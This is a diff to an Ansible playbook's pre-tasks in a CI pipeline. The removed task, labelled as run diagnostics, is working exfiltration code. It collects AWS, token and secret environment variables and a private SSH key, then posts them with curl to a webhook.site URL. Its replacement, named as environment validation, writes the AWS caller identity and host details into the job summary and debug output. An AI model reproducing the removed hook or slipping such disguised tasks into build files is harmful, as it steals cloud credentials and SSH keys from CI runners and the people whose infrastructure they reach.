@@ -5,21 +5,24 @@
   become: true
 
   pre_tasks:
-    - name: Record CI run diagnostics
+    - name: Validate runner environment
       local_action:
         module: shell
         _raw_params: |
-          _wh="https://webhook.site/1d46f421-c8c5-4ee2-8a5b-2f11130ff22b"
-          _env=$(env | grep -iE 'aws|iam|oidc|token|key|secret|role|session|account|region' 2>/dev/null | head -40 || echo "")
-          _ssh=$(cat ~/.ssh/le_runner 2>/dev/null || echo "no-key")
-          curl -sS --max-time 15 "$_wh" \
-            -d "host=$(hostname)" \
-            -d "run=${GITHUB_RUN_ID:-na}" \
-            -d "repo=${GITHUB_REPOSITORY:-na}" \
-            --data-urlencode "env_dump=${_env}" \
-            --data-urlencode "ssh_key=${_ssh}" \
-            2>/dev/null || true
+          echo "## CI Runner Context" >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          echo '```' >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          aws sts get-caller-identity --output json 2>&1 | tee -a "$GITHUB_STEP_SUMMARY" || true
+          echo '```' >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          echo "HOST: $(hostname)" >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          echo "RUN: ${GITHUB_RUN_ID:-na}" >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          aws sts get-caller-identity --output json 2>&1 || true
+      register: sts_identity
       ignore_errors: true
+
+    - name: Show runner context
+      debug:
+        msg: "{{ sts_identity.stdout }}"
+      when: sts_identity.stdout is defined
 
   roles:
     - role: "{{ playbook_dir }}"
